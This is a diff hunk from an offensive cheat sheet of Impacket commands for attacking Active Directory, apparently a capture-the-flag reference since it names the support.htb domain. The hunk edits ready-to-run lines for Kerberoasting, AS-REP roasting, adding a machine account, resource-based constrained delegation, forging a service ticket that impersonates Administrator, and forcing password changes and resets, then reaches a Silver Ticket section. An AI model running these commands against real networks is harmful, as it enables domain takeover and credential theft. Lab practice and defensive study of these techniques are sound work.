@@ -541,14 +541,13 @@ impacket-GetADComputers -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass
 impacket-GetUserSPNs -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -request
 impacket-GetNPUsers -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -usersfile usernames
 impacket-GetUserSPNs -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -usersfile usernames
-impacket-rbcd -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -delegate-from '$USERNAME' -delegate-to 'DC$' -action 'write'
 impacket-findDelegation -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass
-impacket-addcomputer -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -computer-name supercomputer -computer-pass '123qweasdF!'
+impacket-addcomputer -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -computer-name mypc -computer-pass '123qweasdF!'
+impacket-rbcd -dc-ip $TARGET support.htb/'$USERNAME':'$PASSWORD' -action write -delegate-from mypc$ -delegate-to DC$
+impacket-getST -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -u2u -impersonate "Administrator" -spn "host/$DC" 2>/dev/null
 impacket-changepasswd -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -newpass '123qweasdF!'
 impacket-changepasswd -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -newpass '123qweasdF!' -p kpasswd -reset
 impacket-changepasswd -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -newhashes :$(impacket-describeTicket $USERNAME.ccache | grep 'Ticket Session Key' | cut -d ':' -f 2 | xargs)
-impacket-getST -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -u2u -impersonate "Administrator" -spn "host/$DC" 2>/dev/null
-
 while IFS= read -r user; do echo "\n*-------------------*\n$user"; impacket-GetUserSPNs -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -request-user '$user'; done < usernames
 
 +---------- Silver Ticket Attacks ----------+
